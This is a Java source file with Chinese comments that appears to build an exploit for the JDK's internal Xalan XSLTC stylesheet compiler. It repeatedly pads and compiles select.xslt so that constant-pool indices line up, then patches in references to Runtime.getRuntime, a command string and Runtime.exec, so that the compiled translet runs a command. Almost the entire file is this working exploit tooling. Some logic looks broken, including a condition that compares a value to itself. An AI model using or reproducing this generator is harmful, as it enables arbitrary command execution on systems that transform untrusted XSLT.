import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class GenerateJdk {
    public static void main(String args[]) throws IOException {
        //String[] beforeTwoConstant=new String[]{"atA","atB","atC","atD","atE","atF","atG","atH","atI","atJ","atK","atL","atM","atN","atO","atP","atQ","atR","atS","atT","atU","atV","atW","atX","atY","atZ","aua","aub","auc","aud","aue","auf","aug","auh","aui","auj","auk","aul","aum","aun","auo","aup","auq","aur","aus","aut","auu"};
        //String[] beforeOneConstant=new String[]{"<xsl:value-of select='ceiling(133829)'/>","<xsl:value-of select='ceiling(133830)'/>","<xsl:value-of select='ceiling(133831)'/>"};
        //t914-t1051
        //String[] afterTwoConstant=new String[]{};
        //String[] afterOneConstant=new String[]{"<xsl:value-of select='ceiling(133840)'/>","<xsl:value-of select='ceiling(133841)'/>","<xsl:value-of select='ceiling(133842)'/>"};
        compile();
        byte[] selectClassBytes=Util.readFromSourceFile("select.class");
        String selectXsltString=new String(Util.readFromSourceFile("select.xslt"));
        //bytes[8] bytes[9]为常量池长度
        String a=Util.byteToHexString(selectClassBytes[8]);
        String b=Util.byteToHexString(selectClassBytes[9]);
        //确定当前编译出来的常量池和0702的差值
        int changLiangChaZhi=Integer.valueOf("0702",16)-Integer.valueOf(a+b,16);

        //计算com.sun.org.apache.xalan.internal.lib.ExsltStrings的位置
        String exsltStrings="com/sun/org/apache/xalan/internal/lib/ExsltStrings";
        //获得(Class): com/sun/org/apache/xalan/internal/lib/ExsltStrings在select.class中的索引
        int classExsltStringsIdx=new String(selectClassBytes).indexOf(exsltStrings)+exsltStrings.length();
        //得到(Utf8): com/sun/org/apache/xalan/internal/lib/ExsltStrings的索引
        int utf8ExsltStringsIdx =Integer.valueOf(Util.bytesToHexString(Util.subByte(selectClassBytes,classExsltStringsIdx+1,2)),16);
        int exsltStringsChaZhi=261-utf8ExsltStringsIdx;
        if(exsltStringsChaZhi>0){
            //说明要在xslt中的com.sun.org.apache.xalan.internal.lib.ExsltStrings前面填充常量
            selectXsltString=selectXsltString.replace("<!--{before}-->","<!--{before}-->"+Util.generateChangLiang(exsltStringsChaZhi));
            if(changLiangChaZhi>0){
                if(changLiangChaZhi>exsltStringsChaZhi){
                    selectXsltString=selectXsltString.replace("<!--{after}-->","<!--{after}-->"+Util.generateChangLiang(changLiangChaZhi-exsltStringsChaZhi));
                }else{
                    selectXsltString=Util.deleteConstant(selectXsltString,"after",exsltStringsChaZhi-changLiangChaZhi);
                }
            }else{
                //此时changLiangChaZhi为负数
                Util.deleteConstant(selectXsltString,"after",exsltStringsChaZhi+Math.abs(changLiangChaZhi));
            }
        }else if(exsltStringsChaZhi==exsltStringsChaZhi){
            selectXsltString=selectXsltString.replace("<!--{before}-->","<!--{before}-->"+Util.generateChangLiang(exsltStringsChaZhi));
        }else{
            //说明要删除com.sun.org.apache.xalan.internal.lib.ExsltStrings前面的常量
            selectXsltString=Util.deleteConstant(selectXsltString,"before",Math.abs(exsltStringsChaZhi));
            if(changLiangChaZhi>=0){
                selectXsltString=selectXsltString.replace("<!--{after}-->","<!--{after}-->"+Util.generateChangLiang(Math.abs(exsltStringsChaZhi)+changLiangChaZhi));
            }else{
                if(Math.abs(changLiangChaZhi)>=Math.abs(exsltStringsChaZhi)){
                    selectXsltString=Util.deleteConstant(selectXsltString,"after",Math.abs(changLiangChaZhi)-Math.abs(exsltStringsChaZhi));
                }else{
                    selectXsltString=selectXsltString.replace("<!--{after}-->","<!--{after}-->"+Util.generateChangLiang(Math.abs(exsltStringsChaZhi)-Math.abs(changLiangChaZhi)));
                }
            }
        }
        FileOutputStream fileOutputStream=new FileOutputStream("select.xslt");
        fileOutputStream.write(selectXsltString.getBytes());
        fileOutputStream.close();
        //第二次compile
        compile();
        selectClassBytes=Util.readFromSourceFile("select.class");
        char[] utf8Chars1=new char[]{0x08,0x02,0x05};
        //判断后面是不是一个3个长度的字符串并且字符串以0x61的ascii码开头（也就是a开头）
        byte[] bytes=new byte[]{0x01 ,0x00 ,0x03 ,0x61};
        //表示0206位置不是Utf8类型的常量，因为此时0205是utf8常量，0206就是stirng类型的常量
        int index0205=Util.byteIndexChar(selectClassBytes,utf8Chars1);
        if(index0205!=-1&&Util.compareBytesEqual(Util.subByte(selectClassBytes,index0205+utf8Chars1.length,4),bytes)){
            //此时在<!--{after}-->后面加一个常量，在t1051前面减一个常量
            selectXsltString=selectXsltString.replace("<!--{after}-->","<!--{after}-->"+Util.generateChangLiang(1));
            selectXsltString=Util.deleteOneContant(selectXsltString,"after");
            FileOutputStream fileOutputStream2=new FileOutputStream("select.xslt");
            fileOutputStream2.write(selectXsltString.getBytes());
            fileOutputStream2.close();
            compile();
            selectClassBytes=Util.readFromSourceFile("select.class");
        }
        //修改Utf8 (Lorg/apache/xml/serializer/SerializationHandler;)V的位置
        char[] buildKeys=new char[]{0x01,0x00,0x09,0x62,0x75,0x69,0x6C,0x64,0x4B,0x65,0x79,0x73};
        int buildKeysIndex=Util.byteIndexChar(selectClassBytes,buildKeys);
        String tempHexString=Util.bytesToHexString(Util.subByte(selectClassBytes,buildKeysIndex-2,2));
        String utf8SerializationHandlerIndex=Util.convertToStringAndPadding(Integer.valueOf(tempHexString,16)-1,4);
        String utf8TransferIndex=Util.convertToStringAndPadding(Integer.valueOf(tempHexString,16)-2,4);
        String posision0="0x0100470048000102";
        String modifyPosision0=posision0.replace("0048",utf8SerializationHandlerIndex).replace("0047",utf8TransferIndex);
        selectXsltString=Util.replaceXsltToDoubleConstant(selectXsltString,posision0,modifyPosision0);
        //修改(Utf8):<init>常量池位置
        char[] stringInit=new char[]{0x03,0x00,0x02,0x0A,0xC5};
        //得到133829的位置，从这个位置-2的位置取两个字节，这两个字节就是(Utf8):<init>常量池位置
        int index=Util.byteIndexChar(selectClassBytes,stringInit);
        String utf8InitHexString=Util.bytesToHexString(Util.subByte(selectClassBytes,index-2,2));
        String posision1="0x0001008f001e0003";
        String modifyPosision1=posision1.replace("008f",utf8InitHexString);
        System.out.println("modifyPosision1:"+modifyPosision1);
//        String nextLineContent=Util.getNextLineContent(selectXsltString,posision1);
//        selectXsltString=selectXsltString.replace(nextLineContent,Util.toDoubleConstant(modifyPosision1));
        selectXsltString=Util.replaceXsltToDoubleConstant(selectXsltString,posision1,modifyPosision1);
        //修改Utf8 Code的位置
        char[] transletExceptionString=new char[]{0x54 ,0x72 ,0x61 ,0x6E ,0x73 ,0x6C ,0x65 ,0x74 ,0x45 ,0x78 ,0x63 ,0x65 ,0x70 ,0x74 ,0x69 ,0x6F ,0x6E};
        int transletExceptionStringIndex=Util.byteIndexChar(selectClassBytes,transletExceptionString);
        String utf8TransletExceptionHexString=Util.bytesToHexString(Util.subByte(selectClassBytes,transletExceptionStringIndex+transletExceptionString.length+1,2));
        String utf8CodeHexString=Util.convertToStringAndPadding(Integer.valueOf(utf8TransletExceptionHexString,16)-1,4);
        String posision2="0x004d0000002e00FF";
        String modifyPosision2=posision2.replace("004d",utf8CodeHexString);
        selectXsltString=Util.replaceXsltToDoubleConstant(selectXsltString,posision2,modifyPosision2);
        //修正需要执行的代码段
        //修改Methodref(com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet.<init>)常量池位置
        char[] aaaString=new char[]{0x41,0x41,0x41};
        int aaaStringIndex=Util.byteIndexChar(selectClassBytes,aaaString);
        String utf8AAAHexString=Util.bytesToHexString(Util.subByte(selectClassBytes,aaaStringIndex+4,2));
        String methodRefAbstarctTransletHexString=Util.convertToStringAndPadding(Integer.valueOf(utf8AAAHexString,16)-2,4);
        String posision3="0x3C2AB70089000000";
        String modifyPosision3=posision3.replace("0089",methodRefAbstarctTransletHexString);
        System.out.println("modifyPosision2:"+modifyPosision3);
        selectXsltString=Util.replaceXsltToDoubleConstant(selectXsltString,posision3,modifyPosision3);
        //修正Methodref(java/lang/Runtime.getRuntime)位置和String Command的位置
        char[] getRuntimeString=new char[]{0x6A ,0x61 ,0x76 ,0x61 ,0x2E ,0x6C ,0x61 ,0x6E ,0x67 ,0x2E ,0x52 ,0x75 ,0x6E ,0x74 ,0x69 ,0x6D ,0x65 ,0x3A ,0x67 ,0x65 ,0x74 ,0x52 ,0x75 ,0x6E ,0x74 ,0x69 ,0x6D ,0x65};
        int getRuntimeStringIndex=Util.byteIndexChar(selectClassBytes,getRuntimeString);
        String utf8GetRuntimeIndex=Util.bytesToHexString(Util.subByte(selectClassBytes,getRuntimeStringIndex+getRuntimeString.length+1,2));
        String methodRefGetRuntimeHexString=Util.convertToStringAndPadding(Integer.valueOf(utf8GetRuntimeIndex,16)+7,4);
        String stringCommandHexString=Util.convertToStringAndPadding(Integer.valueOf(utf8GetRuntimeIndex,16)+9,4);
        String posision4="0x3CB8007713007900";
        String modifyPosision4=posision4.replace("0077",methodRefGetRuntimeHexString).replace("0079",stringCommandHexString);
        selectXsltString=Util.replaceXsltToDoubleConstant(selectXsltString,posision4,modifyPosision4);
        //Methodref(java/lang/Runtime.exec)位置修正
        String methodRefExecHexString=Util.convertToStringAndPadding(Integer.valueOf(utf8GetRuntimeIndex,16)+13,4);
        String posision5="0x3CB6007d57000000";
        String modifyPosision5=posision5.replace("007d",methodRefExecHexString);
        selectXsltString=Util.replaceXsltToDoubleConstant(selectXsltString,posision5,modifyPosision5);
        //修改attribute_length
        char[] oneTwoThreaChars=new char[]{0x12,0x34,0x56,0x78};
        int oneTwoThreaIndex=Util.byteIndexChar(selectClassBytes,oneTwoThreaChars);
        int attribute_length=selectClassBytes.length-10-oneTwoThreaIndex;
        String attribute_lengthHexString=Util.convertToStringAndPadding(attribute_length,6);
        String posision6="0x0007dd9412345678";
        String modifyPosision6=posision6.replace("07dd94",attribute_lengthHexString);
        System.out.println("modifyPosision3:"+modifyPosision6);
        selectXsltString=Util.replaceXsltToDoubleConstant(selectXsltString,posision6,modifyPosision6);
        FileOutputStream fileOutputStream1=new FileOutputStream("select.xslt");
        fileOutputStream1.write(selectXsltString.getBytes());
        fileOutputStream1.close();
        compile();
//        System.out.println(selectXsltString);
    }

    private static void compile(){
        try {
            if(new File("select.class").exists()){
                new File("select.class").delete();
            }
            Thread.sleep(2000);
            com.sun.org.apache.xalan.internal.xslt.Process._main(new String[]{"-XSLTC", "-IN", "1.xml", "-XSL", "select.xslt", "-SECURE", "-XX", "-XT"});
        }catch (Exception e){}
    }
}
